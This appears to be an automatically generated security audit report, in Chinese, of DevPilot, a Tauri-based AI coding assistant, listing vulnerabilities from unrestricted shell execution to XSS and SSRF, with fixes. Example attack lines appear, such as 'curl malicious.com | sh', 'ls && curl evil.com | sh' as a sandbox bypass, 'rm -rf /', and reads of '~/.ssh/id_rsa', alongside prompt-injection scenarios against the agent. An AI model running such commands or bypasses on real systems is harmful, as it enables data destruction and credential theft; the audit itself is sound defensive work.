# DevPilot 安全审计报告

**审计日期**: 2026-05-01  
**项目版本**: 2026.4.30  
**技术栈**: Tauri 2 (Rust) + React 19 + TypeScript + Vite 8  
**审计范围**: 14 个 Rust crate + 前端 + Tauri 配置 + 依赖 + 数据存储

---

## 一、安全漏洞列表（按严重程度排序）

### CRITICAL（严重）

#### [C-01] shell_exec 工具无命令限制 — 任意命令执行

- **文件**: `crates/devpilot-tools/src/tools/shell.rs`
- **描述**: `ShellExecTool` 直接将用户（通过 LLM）提供的命令字符串传给 `sh -c`，没有任何命令白名单、黑名单或路径限制。虽然有 `requires_approval() = true` 的审批门控，但一旦用户批准，攻击面完全开放。
- **风险**: LLM 产生幻觉或被 prompt injection 诱导执行 `rm -rf /`、`curl malicious.com | sh`、读取 `~/.ssh/id_rsa` 等破坏性命令。
- **修复方案**:
  1. 引入与 sandbox 类似的命令白名单/黑名单机制
  2. 对敏感路径（`~/.ssh`、`/etc/shadow`、`~/.gnupg`）的读写操作增加额外告警
  3. 限制单次命令执行的超时和输出大小（当前只有超时，无输出限制）
  4. 增加 `--dangerously-skip-approval` 之外的强制审批确认机制

#### [C-02] file_write / file_read 工具无路径遍历防护

- **文件**: `crates/devpilot-tools/src/tools/file_write.rs`, `file_read.rs`
- **描述**: 这两个工具接受任意绝对或相对路径，没有路径规范化（canonicalize）、没有沙箱边界检查、没有符号链接解析。攻击者可以通过 `../../etc/passwd` 或 `/etc/shadow` 等路径读取/写入任意系统文件。
- **风险**: 读取敏感文件（SSH 密钥、配置中的 API key）、覆写关键系统文件。
- **修复方案**:
  ```rust
  // 在 execute() 开头添加路径规范化
  let canonical = std::fs::canonicalize(&path)?;
  let workdir = std::fs::canonicalize(&ctx.working_dir)?;
  if !canonical.starts_with(&workdir) {
      return Err("Path traversal detected: path outside working directory");
  }
  // 同时检查符号链接目标
  ```

#### [C-03] PTY shell 参数注入 — 任意进程启动

- **文件**: `src-tauri/src/commands/pty.rs:85-91`
- **描述**: `pty_create` 接受前端传入的 `shell` 参数，直接传给 `CommandBuilder::new(shell)` 而不验证是否为合法 shell。攻击者可以传入任意可执行文件路径。
- **风险**: 启动恶意进程、绕过所有沙箱限制。
- **修复方案**:
  ```rust
  // 限制 shell 为已知合法的 shell 列表
  const ALLOWED_SHELLS: &[&str] = &["/bin/sh", "/bin/bash", "/bin/zsh", "/usr/bin/fish"];
  let shell = req.shell.as_deref()
      .filter(|s| ALLOWED_SHELLS.contains(&s.as_str()))
      .unwrap_or("/bin/sh");
  ```

#### [C-04] read_file_content / write_file_content IPC 无权限边界

- **文件**: `src-tauri/src/commands/editor.rs:110-129`
- **描述**: 这两个 Tauri IPC 命令直接接受前端传入的任意文件路径进行读写，没有任何路径限制、审批机制或权限检查。这是绕过工具审批系统的直接文件访问通道。
- **风险**: 前端 XSS 或恶意扩展可以读写任意文件。
- **修复方案**:
  1. 将文件操作限制在当前 session 的 working_dir 内
  2. 添加路径规范化 + 边界检查
  3. 对写操作增加用户确认对话框

### HIGH（高危）

#### [H-01] Tauri capabilities 权限过度 — shell:allow-execute/spawn

- **文件**: `src-tauri/capabilities/default.json`
- **描述**: 前端被授予 `shell:allow-execute`、`shell:allow-spawn`、`shell:allow-stdin-write`、`shell:allow-kill` 权限。这些权限允许前端直接执行任意系统命令，完全绕过后端的沙箱和审批系统。
- **风险**: 前端 XSS 漏洞可直接被利用为 RCE。
- **修复方案**:
  1. 从 capabilities 中移除 `shell:allow-execute` 和 `shell:allow-spawn`
  2. 所有命令执行只通过自定义 IPC 命令（已有 `shell_exec` 工具），不经 shell plugin
  3. 如果 PTY 需要 shell plugin，使用 Tauri 2 的 shell scope 限制可执行的命令

#### [H-02] 前端 XSS — rehype-raw 允许任意 HTML 注入

- **文件**: `src/components/chat/MarkdownRenderer.tsx:64`
- **描述**: `rehypePlugins={[rehypeRaw, rehypeKatex]}` 允许 LLM 返回的 markdown 中包含任意 HTML 标签，包括 `<script>`、`<img onerror=...>`、`<iframe>` 等。虽然 react-markdown 会过滤部分标签，但 rehype-raw 绕过了这个保护。
- **风险**: 恶意 LLM 响应或 prompt injection 可注入 XSS payload，窃取前端状态中的 API key。
- **修复方案**:
  1. 使用 DOMPurify（已在 package.json overrides 中声明但未在此处使用）过滤 rehype-raw 输出
  2. 或移除 `rehypeRaw` 插件，改用自定义组件渲染
  ```typescript
  import DOMPurify from 'dompurify';
  // 在 rehype-raw 处理后添加净化
  rehypePlugins={[rehypeRaw, () => ({/* sanitizer plugin */})]}
  ```

#### [H-03] Mermaid securityLevel: "loose" 允许 JavaScript 执行

- **文件**: `src/components/chat/MermaidRenderer.tsx:36`
- **描述**: Mermaid 初始化使用 `securityLevel: "loose"`，允许在 Mermaid 图表中嵌入任意 HTML 和 JavaScript。结合 `dangerouslySetInnerHTML={{ __html: svg }}`（第 113 行），形成完整的 XSS 攻击链。
- **修复方案**:
  ```typescript
  api.initialize({
    startOnLoad: false,
    theme: "dark",
    securityLevel: "strict", // 改为 "strict"
    fontFamily: "var(--font-mono)",
  });
  ```

#### [H-04] API key 加密密钥可预测 — 未使用 OS Keychain

- **文件**: `crates/devpilot-store/src/crypto.rs:54-59`
- **描述**: API key 的加密密钥通过 `SHA-256(data_dir_path + label)` 派生。`data_dir_path` 是公开可知的系统路径（如 `~/Library/Application Support/devpilot/`），label 是硬编码常量。任何知道用户系统的攻击者都能推导出密钥并解密。
- **风险**: 数据库文件被盗后 API key 可被轻易解密。
- **修复方案**:
  1. 使用 OS 原生密钥存储：macOS Keychain、Linux Secret Service、Windows Credential Manager
  2. 推荐使用 `keyring` crate 跨平台访问 OS keychain
  3. 短期方案：至少加入机器唯一标识（如硬件 UUID）作为密钥派生输入

#### [H-05] Updater pubkey 为空 — 更新包无签名验证

- **文件**: `src-tauri/tauri.conf.json:45`
- **描述**: `"pubkey": ""` 意味着自动更新不验证下载包的签名。攻击者如果能中间人攻击更新端点，可以推送恶意更新。
- **修复方案**:
  1. 生成 Ed25519 密钥对，将公钥填入配置
  2. 在 CI/CD 中使用私钥签名更新包
  3. 确保 endpoints 使用 HTTPS

#### [H-06] SQLite 数据库文件无加密

- **文件**: `crates/devpilot-store/src/store.rs`
- **描述**: SQLite 数据库存储所有会话历史、设置和加密的 API key（虽然 key 本身是 AES 加密的，但数据库整体未加密），使用普通 `rusqlite` 而非 `sqlcipher`。
- **风险**: 数据库文件直接可读，暴露所有聊天记录、工作目录路径、环境变量等。
- **修复方案**:
  1. 使用 `rusqlite` 的 `sqlcipher` feature 启用数据库加密
  2. 或使用 `PRAGMA key` 设置数据库加密密钥

### MEDIUM（中危）

#### [M-01] Sandbox 默认策略 command_allowlist: None — 所有命令允许

- **文件**: `crates/devpilot-sandbox/src/policy.rs:147`
- **描述**: `SandboxPolicy::default()` 的 `command_allowlist` 为 `None`（允许所有命令），`network` 为 `Allow`，`readonly_fs` 为 `false`。默认策略几乎等同于无沙箱。
- **修复方案**: 将默认策略收紧，至少设置合理的命令白名单。

#### [M-02] Sandbox 的 is_command_allowed 检查可被绕过

- **文件**: `crates/devpilot-sandbox/src/policy.rs:214-223`
- **描述**: 只检查命令的第一个单词（空格分割），可以通过 `ls; rm -rf /` 或 `ls && curl evil.com | sh` 绕过。`sh -c` 会执行整个字符串。
- **修复方案**:
  1. 禁止命令中包含 `;`、`&&`、`||`、`|`、`$()`、`` ` `` 等 shell 元字符
  2. 或改用参数数组而非 shell 字符串执行

#### [M-03] Sandbox 的 is_workdir_allowed 路径匹配不安全

- **文件**: `crates/devpilot-sandbox/src/policy.rs:230-245`
- **描述**: 使用 `starts_with` 做字符串前缀匹配而非规范化路径比较。`/tmp` 规则会匹配 `/tmpszak` 这样的路径；`/home` 规则会匹配 `/home.attacker`。缺少符号链接解析。
- **修复方案**: 使用 `Path::canonicalize()` + `Path::starts_with()` 做规范化路径比较。

#### [M-04] web_fetch / web_search 的 SSRf 风险

- **文件**: `crates/devpilot-tools/src/tools/web_fetch.rs`, `web_search.rs`
- **描述**: 虽然验证了 URL 必须以 `http://` 或 `https://` 开头，但没有阻止对内网地址的访问（如 `http://169.254.169.254` AWS 元数据、`http://localhost:6379` Redis 等）。
- **修复方案**:
  1. 添加私有 IP 段过滤（10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16, 127.0.0.0/8）
  2. 阻止 DNS 重绑定攻击（检查解析后的 IP）

#### [M-05] MCP 服务器 stdio 命令注入

- **文件**: `src-tauri/src/commands/mcp.rs:103-104`
- **描述**: MCP 服务器配置中的 `command` 字段直接来自用户输入/数据库，无验证。用户配置恶意 MCP 服务器时可执行任意命令。
- **修复方案**:
  1. 验证 command 必须在 PATH 中或使用绝对路径
  2. 对 MCP 服务器命令设置白名单或沙箱
  3. 在连接前显示安全警告

#### [M-06] 前端 CSP 中 http://localhost:\* 过于宽松

- **文件**: `src-tauri/tauri.conf.json:26`
- **描述**: `connect-src` 包含 `http://localhost:*`，允许前端连接任意本地端口。在生产构建中应移除。
- **修复方案**: 生产环境移除 `http://localhost:*`，仅保留必要的 API 端点。

#### [M-07] get_provider_api_key IPC 暴露解密后的 API key

- **文件**: `src-tauri/src/commands/mod.rs:249-255`
- **描述**: `get_provider_api_key` 命令将解密后的 API key 明文返回给前端。前端 JS 环境中的 API key 可被 XSS 窃取。
- **修复方案**:
  1. API key 只在后端 Rust 中使用，不传到前端
  2. 前端只显示 key 的最后 4 位（如 `sk-...xfde`）
  3. 如果前端需要输入 key，只通过 upsert 通道传入，不回读

### LOW（低危）

#### [L-01] Bridge token 存储未加密

- **文件**: `src-tauri/src/commands/bridge.rs`
- **描述**: Bridge 配置中的 `token`（Telegram bot token、Slack token 等）存储在内存和 SQLite 中但未加密。
- **修复方案**: 使用与 API key 相同的 AES-256-GCM 加密。

#### [L-02] SandboxBlock 渲染用户 HTML — iframe 注入

- **文件**: `src/components/chat/MarkdownRenderer.tsx:87-93`
- **描述**: ```html 代码块通过 `SandboxBlock` 组件渲染。需确认 SandboxBlock 是否使用了 sandbox 属性的 iframe。
- **修复方案**: 确保 `<iframe sandbox="allow-scripts">` 不包含 `allow-same-origin`。

#### [L-03] import_sessions 无大小限制

- **文件**: `src-tauri/src/commands/mod.rs:335-413`
- **描述**: `import_sessions` 接受前端传入的 JSON 字符串，无大小限制。超大 JSON 可能导致内存耗尽。
- **修复方案**: 添加输入大小限制（如 50MB）。

#### [L-04] env_vars 注入风险

- **文件**: `src-tauri/src/commands/mod.rs:208-217`
- **描述**: `set_session_env_vars` 允许前端设置任意环境变量，这些变量会被注入到 shell_exec 和 PTY 的子进程中。
- **修复方案**: 过滤敏感环境变量名（如 `LD_PRELOAD`, `DYLD_INSERT_LIBRARIES`, `PATH`, `HOME`）。

#### [L-05] 依赖的 reqwest 使用 rustls-tls（仅后端）

- **描述**: 后端依赖已正确使用 `rustls-tls` 而非 OpenSSL，减少 TLS 攻击面。这是正面发现。

---

## 二、架构问题和改进建议

### [A-01] 双重命令执行通道 — 安全边界不统一

- **问题**: 项目同时存在三个命令执行路径：(1) `shell_exec` 工具（有审批），(2) `sandbox_execute` IPC（有策略），(3) `shell:allow-execute` Tauri plugin（无限制）。安全策略不统一。
- **建议**: 统一为单一通道，所有命令执行必须经过审批 + 沙箱策略。

### [A-02] 工具权限模型粒度不足

- **问题**: `requires_approval()` 只返回 bool，没有基于风险的分级审批。`file_read` 不需要审批但可能读取敏感文件。
- **建议**:
  1. 实现三级风险模型：low（自动批准）、medium（单次确认）、high（需要输入确认文本）
  2. 基于路径敏感度（`~/.ssh` > `~/projects`）、命令类型（`rm` > `ls`）动态调整

### [A-03] 缺少审计日志

- **问题**: 工具执行、文件操作、命令执行没有不可篡改的审计日志。
- **建议**: 添加 append-only 审计日志文件，记录所有安全敏感操作。

### [A-04] 前端状态管理中的敏感数据

- **问题**: Zustand store 中可能包含 API key 等敏感数据（通过 IPC 获取），存储在 JS 内存中。
- **建议**: 前端永远不持有明文 API key，所有需要 API key 的操作通过 IPC 让后端处理。

### [A-05] Tauri IPC 无速率限制

- **问题**: 所有 IPC 命令无速率限制，可被恶意前端高频调用。
- **建议**: 对敏感命令（如 `execute_tool`、`sandbox_execute`、`shell_exec`）添加速率限制。

### [A-06] Session isolation 不足

- **问题**: 所有 session 共享同一个 `AppState`，一个 session 的 env_vars 可能通过共享资源影响另一个。
- **建议**: 每个 session 应有独立的资源隔离上下文。

---

## 三、修复优先级路线图

### P0 — 立即修复（1-3 天）

1. **[C-01]** shell_exec 添加命令黑名单/白名单
2. **[C-02]** file_read/file_write 添加路径遍历防护
3. **[H-01]** 从 capabilities 移除 `shell:allow-execute`/`shell:allow-spawn`
4. **[H-02]** MarkdownRenderer 使用 DOMPurify
5. **[H-03]** Mermaid securityLevel 改为 "strict"

### P1 — 短期修复（1 周）

6. **[C-03]** PTY shell 参数验证
7. **[C-04]** editor.rs 文件操作路径限制
8. **[H-05]** 配置 updater 公钥
9. **[M-01]** 收紧 sandbox 默认策略
10. **[M-02]** 修复命令注入绕过

### P2 — 中期修复（2-4 周）

11. **[H-04]** 迁移到 OS Keychain 存储 API key
12. **[H-06]** 启用 SQLite 加密
13. **[M-03]** 修复路径规范化
14. **[M-04]** SSRf 防护
15. **[M-07]** 前端不暴露明文 API key

### P3 — 长期改进（1-2 月）

16. **[A-01]** 统一命令执行通道
17. **[A-02]** 实现分级权限模型
18. **[A-03]** 添加审计日志系统
19. **[A-05]** IPC 速率限制

---

## 四、正面发现（做得好的部分）

1. **AES-256-GCM 加密 API key** — 使用了现代 AEAD 加密（虽然密钥派生需要改进）
2. **工具审批系统** — 有完整的审批门控（`ApprovalGate`）
3. **Sandbox rlimit 限制** — Unix 下使用 setrlimit 限制 CPU、内存、文件描述符、核心转储
4. **env_clear** — 沙箱和 shell_exec 都使用 `cmd.env_clear()` 清除环境变量
5. **deny.toml 配置** — 使用 cargo-deny 检查依赖漏洞和许可证
6. **reqwest rustls-tls** — 使用内存安全的 TLS 实现
7. **CSP 配置** — 有内容安全策略（虽然可以更严格）
8. **DOMPurify override** — package.json 中已声明 dompurify 依赖
9. **no localStorage/sessionStorage** — 前端不使用浏览器存储保存敏感数据
10. **no .env files** — 项目中没有硬编码的密钥文件

---

_本报告由安全审计自动生成，建议结合手动渗透测试进行验证。_
